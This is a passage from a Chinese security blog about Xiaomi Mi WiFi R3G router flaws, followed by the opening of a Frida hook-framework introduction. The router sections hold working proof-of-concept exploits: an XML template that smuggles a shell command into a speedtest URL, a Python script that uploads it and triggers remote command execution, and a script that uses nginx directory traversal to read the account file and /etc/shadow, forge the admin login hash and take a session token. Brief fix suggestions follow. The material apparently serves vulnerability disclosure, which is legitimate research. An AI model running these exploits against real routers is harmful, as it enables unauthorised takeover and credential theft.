class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- VERSION 为 __UNDEFINED__， url直接作为参数</span></span><br><span class="line">		<span class="keyword">local</span> pid = wget_work(resources[v])</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">elseif</span>(pid == <span class="number">-1</span>) <span class="keyword">then</span></span><br><span class="line">		done()</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>调用的地方貌似有好几个，其中<code>/usr/lib/lua/luci/controller/api/xqnetdetect.lua</code>中</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netspeed</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> XQPreference = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.XQPreference&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> XQNSTUtil = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> history = LuciHttp.formvalue(<span class="string">&quot;history&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> history <span class="keyword">then</span></span><br><span class="line">        result[<span class="string">&quot;bandwidth&quot;</span>] = <span class="built_in">tonumber</span>(XQPreference.get(<span class="string">&quot;BANDWIDTH&quot;</span>, <span class="number">0</span>, <span class="string">&quot;xiaoqiang&quot;</span>))</span><br><span class="line">        result[<span class="string">&quot;download&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">128</span> * result.bandwidth))</span><br><span class="line">        result[<span class="string">&quot;bandwidth2&quot;</span>] = <span class="built_in">tonumber</span>(XQPreference.get(<span class="string">&quot;BANDWIDTH2&quot;</span>, <span class="number">0</span>, <span class="string">&quot;xiaoqiang&quot;</span>))</span><br><span class="line">        result[<span class="string">&quot;upload&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">128</span> * result.bandwidth2))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/etc/init.d/miqos stop&quot;</span>)</span><br><span class="line">        <span class="comment">-- 这里调用了downloadSpeedTest</span></span><br><span class="line">        <span class="keyword">local</span> download = XQNSTUtil.downloadSpeedTest()</span><br><span class="line">        <span class="keyword">if</span> download <span class="keyword">then</span></span><br><span class="line">            result[<span class="string">&quot;download&quot;</span>] = download</span><br><span class="line">            result[<span class="string">&quot;bandwidth&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">8</span> * download/<span class="number">1024</span>))</span><br><span class="line">            XQPreference.set(<span class="string">&quot;BANDWIDTH&quot;</span>, <span class="built_in">tostring</span>(result.bandwidth), <span class="string">&quot;xiaoqiang&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1588</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">           result[<span class="string">&quot;msg&quot;</span>] = XQErrorUtil.getErrorMessage(code)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/etc/init.d/miqos start&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = code</span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadSpeedTest</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> speedtest = <span class="string">&quot;/usr/bin/download_speedtest&quot;</span></span><br><span class="line">    <span class="keyword">local</span> speed</span><br><span class="line">    <span class="comment">-- 直接调用sh文件</span></span><br><span class="line">    <span class="keyword">for</span> _, line <span class="keyword">in</span> <span class="built_in">ipairs</span>(LuciUtil.execl(speedtest)) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> XQFunction.isStrNil(line) <span class="keyword">and</span> line:<span class="built_in">match</span>(<span class="string">&quot;^avg rx:&quot;</span>) <span class="keyword">then</span></span><br><span class="line">            speed = line:<span class="built_in">match</span>(<span class="string">&quot;^avg rx:(%S+)&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> speed <span class="keyword">then</span></span><br><span class="line">                speed = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>,speed/<span class="number">8</span>))</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> speed</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>所以，我们只需要构造恶意的<code>speedtest_urls.xml</code>文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
<p>template.xml</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://192.168.31.1 -q -O /dev/null;&#123;command&#125;&gt;/tmp/1.txt; exit; wget http://192.168.31.1  &quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.taobao.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.so.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.qq.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.sohu.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.tudou.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.360doc.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.kankan.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.speedtest.cn/&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>remote_command_execution_vulnerability.py</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## get stok</span></span><br><span class="line">stok = input(<span class="string">&quot;stok: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## make config file</span></span><br><span class="line">command = input(<span class="string">&quot;command: &quot;</span>)</span><br><span class="line">speed_test_filename = <span class="string">&quot;speedtest_urls.xml&quot;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;template.xml&quot;</span>,<span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	template = f.read()</span><br><span class="line">data = template.format(command=command)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;speedtest_urls.xml&quot;</span>,<span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.open(<span class="string">&quot;payload.tar.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">	<span class="comment"># tar.add(&quot;cfg_backup.des&quot;)</span></span><br><span class="line">	<span class="comment"># tar.add(&quot;cfg_backup.mbu&quot;)</span></span><br><span class="line">	tar.add(<span class="string">&quot;speedtest_urls.xml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## upload config file</span></span><br><span class="line">print(<span class="string">&quot;start uploading config file ...&quot;</span>)</span><br><span class="line">r1 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;</span>.format(stok), files=&#123;<span class="string">&quot;image&quot;</span>:open(<span class="string">&quot;payload.tar.gz&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;, proxies=proxies)</span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## exec download speed test, exec command</span></span><br><span class="line">print(<span class="string">&quot;start exec command...&quot;</span>)</span><br><span class="line">r2 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;</span>.format(stok), proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read result file</span></span><br><span class="line">r3 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;</span>, proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> r3.status_code == <span class="number">200</span>:</span><br><span class="line">	print(<span class="string">&quot;success, vul&quot;</span>)</span><br><span class="line">	print(r3.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904223817264.png" alt="image-20200904223817264"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol>
<li>将备份文件格式修改为特定格式，直接读取备份文件内容，而不需使用解压</li>
<li>从<code>speedtest_urls.xml</code>中读取urls时，进行必要的过滤，防止命令注入</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md">https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>XiaoMi</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-18371)Xiaomi Mi WiFi R3G 远程命令执行漏洞</title>
    <url>/2020/09/12/IOT/Exploit/%E5%B0%8F%E7%B1%B3/CVE-2019-18371-Xiaomi-Mi-WiFi-R3G-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Xiaomi Mi WiFi R3G 2.28.23-stable之前版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）"><a href="#小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）" class="headerlink" title="小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）"></a>小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）</h4><p>nginx配置不当可导致目录穿越漏洞，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;xxx &#123;</span><br><span class="line">  alias &#x2F;abc&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过访问<code>http://domain.cn/xxx../etc/passwd</code>实现目录穿越访问上级目录及其子目录文件。</p>
<p>在小米路由器的文件<code>/etc/sysapihttpd/sysapihttpd.conf</code>中，存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;api-third-party&#x2F;download&#x2F;extdisks &#123;</span><br><span class="line">	alias &#x2F;extdisks&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>故可以任意文件读取根目录下的所有文件，而且是root权限，如访问<code>http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904224803971.png" alt="image-20200904224803971"></p>
<p>类似的问题，存在多处如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;backup&#x2F;log &#123;</span><br><span class="line">	alias &#x2F;tmp&#x2F;syslogbackup&#x2F;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;api-third-party&#x2F;download&#x2F;public &#123;</span><br><span class="line">	alias &#x2F;userdisk&#x2F;data&#x2F;;</span><br><span class="line">&#125;</span><br><span class="line">location &#x2F;api-third-party&#x2F;download&#x2F;private &#123;</span><br><span class="line">	alias &#x2F;userdisk&#x2F;appdata&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="通过任意文件读取，登录路由器后台"><a href="#通过任意文件读取，登录路由器后台" class="headerlink" title="通过任意文件读取，登录路由器后台"></a>通过任意文件读取，登录路由器后台</h4><p>不是明文存储密码，进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。</p>
<p>登录时前端js生成http post请求参数过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Encrypt &#x3D; &#123;</span><br><span class="line">    key: &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;,</span><br><span class="line">    iv: &#39;64175472480004614961023454661220&#39;,</span><br><span class="line">    nonce: null,</span><br><span class="line">    init: function()&#123;</span><br><span class="line">        var nonce &#x3D; this.nonceCreat();</span><br><span class="line">        this.nonce &#x3D; nonce;</span><br><span class="line">        return this.nonce;</span><br><span class="line">    &#125;,</span><br><span class="line">    nonceCreat: function()&#123;</span><br><span class="line">        var type &#x3D; 0;</span><br><span class="line">        &#x2F;&#x2F; 自己的mac地址</span><br><span class="line">        var deviceId &#x3D; &#39;&lt;%&#x3D;mac%&gt;&#39;;</span><br><span class="line">        var time &#x3D; Math.floor(new Date().getTime() &#x2F; 1000);</span><br><span class="line">        var random &#x3D; Math.floor(Math.random() * 10000);</span><br><span class="line">        return [type, deviceId, time, random].join(&#39;_&#39;);</span><br><span class="line">    &#125;,</span><br><span class="line">    oldPwd : function(pwd)&#123; &#x2F;&#x2F; oldPwd &#x3D; sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</span><br><span class="line">        return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString();</span><br><span class="line">    &#125;,</span><br><span class="line">  &#x2F;&#x2F;...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可知<code>oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</code>，登陆请求包为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;luci&#x2F;api&#x2F;xqsystem&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&amp;logtype&#x3D;2&amp;nonce&#x3D;0_mac地址_时间戳_5248</span><br></pre></td></tr></table></figure>

<p>验证用户登陆的后端过程</p>
<p>调用<code>XQSecureUtil.checkUser</code>函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkUser(user, nonce, encStr)</span><br><span class="line">    -- 从xiaoqiang 配置文件中读取信息</span><br><span class="line">    local password &#x3D; XQPreference.get(user, nil, &quot;account&quot;)</span><br><span class="line">    if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then</span><br><span class="line">        if XQCryptoUtil.sha1(nonce..password) &#x3D;&#x3D; encStr then</span><br><span class="line">            return true</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    XQLog.log(4, (luci.http.getenv(&quot;REMOTE_ADDR&quot;) or &quot;&quot;)..&quot; Authentication failed&quot;, nonce, password, encStr)</span><br><span class="line">    return false</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>跟进<code>XQPreference.get</code>函数易知道是从<code>/etc/config/account</code>文件中读取某个字符串，这里称它为<code>accountStr</code>。</p>
<p><code>checkUser</code>函数判断等式为(encStr为参数oldPwd)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sha1(nonce + sha1(密码 + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</span><br><span class="line">&#x3D;&#x3D;</span><br><span class="line">sha1(nonce + accountStr)</span><br></pre></td></tr></table></figure>

<p>则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accountStr &#x3D;&#x3D; sha1(密码 + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;)</span><br></pre></td></tr></table></figure>

<p>故，只需要读取<code>/etc/config/account</code>得到<code>accountStr</code>即可构造如下数据包登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;luci&#x2F;api&#x2F;xqsystem&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;sha1(nonce + account中保存的字符串)&amp;logtype&#x3D;2&amp;nonce&#x3D;0_mac地址_时间戳_5248</span><br></pre></td></tr></table></figure>

<p>实现任意登陆poc</p>
<p>arbitrary_file_read_vulnerability.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>():</span></span><br><span class="line">	<span class="comment">## get mac</span></span><br><span class="line">	r0 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/web&quot;</span>, proxies=proxies)</span><br><span class="line">	mac = re.findall(<span class="string">r&#x27;deviceId = \&#x27;(.*?)\&#x27;&#x27;</span>, r0.text)[<span class="number">0</span>]</span><br><span class="line">	<span class="comment"># print(mac)	</span></span><br><span class="line">	<span class="keyword">return</span> mac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_account_str</span>():</span></span><br><span class="line">	<span class="comment">## read /etc/config/account</span></span><br><span class="line">	r1 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;</span>, proxies=proxies)</span><br><span class="line">	print(r1.text)</span><br><span class="line">	account_str = re.findall(<span class="string">r&#x27;admin\&#x27;? \&#x27;(.*)\&#x27;&#x27;</span>, r1.text)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">return</span> account_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nonce</span>(<span class="params">mac</span>):</span></span><br><span class="line">	type_ = <span class="number">0</span></span><br><span class="line">	deviceId = mac</span><br><span class="line">	time_ = int(time.time())</span><br><span class="line">	rand = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;%d_%s_%d_%d&quot;</span>%(type_, deviceId, time_, rand)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_password</span>(<span class="params">nonce, account_str</span>):</span></span><br><span class="line">	m = hashlib.sha1()</span><br><span class="line">	m.update((nonce + account_str).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	<span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line">mac = get_mac()</span><br><span class="line">account_str = get_account_str()</span><br><span class="line"><span class="comment">## login, get stok</span></span><br><span class="line">nonce = create_nonce(mac)</span><br><span class="line">password = calc_password(nonce, account_str)</span><br><span class="line">data = <span class="string">&quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;</span>.format(password=password,nonce=nonce)</span><br><span class="line">r2 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;</span>, </span><br><span class="line">	data = data, </span><br><span class="line">	headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;,</span><br><span class="line">	proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line">stok = re.findall(<span class="string">r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">&quot;stok=&quot;</span>+stok)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以获取到登录的stok</p>
</blockquote>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904234409100.png" alt="image-20200904234409100"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>将<code>/etc/sysapihttpd/sysapihttpd.conf</code>中的形如以下形式修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;xxx &#123;</span><br><span class="line">  alias &#x2F;abc&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;xxx&#x2F; &#123;</span><br><span class="line">  alias &#x2F;abc&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md">https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>XiaoMi</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook框架Firada</title>
    <url>/2020/09/22/Android/Hook%E6%A1%86%E6%9E%B6Firada/</url>
    <content><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Frida是个轻量级别的hook框架</p>
<p><strong>是Python API，但JavaScript调试逻辑</strong></p>
<p>Frida的核心是用C编写的，并将<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdevelopers.google.com%2Fv8%2F">Google的V8引擎</a>注入到目标进程中，在这些进程中，JS可以完全访问内存，挂钩函数甚至调用进程内的本机函数来执行。</p>
<p>使用Python和JS可以使用无风险的API进行快速开发。Frida可以帮助您轻松捕获JS中的错误并为您提供异常而不是崩溃。<br> 。<br> 关于frda学习路线了，Frida的学习还是蛮简单的，只需要了解两方面的内容：<br> 1）主控端和目标进程的交互（message）<br> 2）Python接口和js接口（查文档）</p>
<p>frida框架分为两部分：<br> 1）一部分是运行在系统上的交互工具frida CLI。<br> 2）另一部分是运行在目标机器上的代码注入工具 frida-serve。</p>
